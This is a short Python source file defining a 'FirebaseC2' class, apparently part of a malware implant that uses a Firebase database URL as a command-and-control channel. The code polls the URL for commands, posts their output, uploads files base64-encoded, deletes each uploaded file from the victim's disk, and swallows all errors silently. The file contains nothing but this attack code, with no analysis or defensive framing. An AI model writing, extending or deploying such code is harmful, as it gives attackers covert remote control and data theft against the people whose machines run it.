import requests
import json
import time
import os
import base64

class FirebaseC2:
    def __init__(self, url):
        self.url = url
    
    def send_message(self, msg):
        try:
            requests.put(self.url, json={"output": msg, "timestamp": time.time()}, timeout=5)
        except:
            pass
    
    def send_file(self, path):
        try:
            with open(path, 'rb') as f:
                encoded = base64.b64encode(f.read()).decode()
                self.send_message(f"FILE: {os.path.basename(path)}\n{encoded}")
            os.remove(path)
        except:
            pass
    
    def get_commands(self):
        try:
            r = requests.get(self.url, timeout=5)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict) and "command" in data:
                    return [data["command"]]
        except:
            pass
        return []
    
    def delete_command(self, cmd):
        try:
            requests.delete(self.url, timeout=5)
        except:
            pass
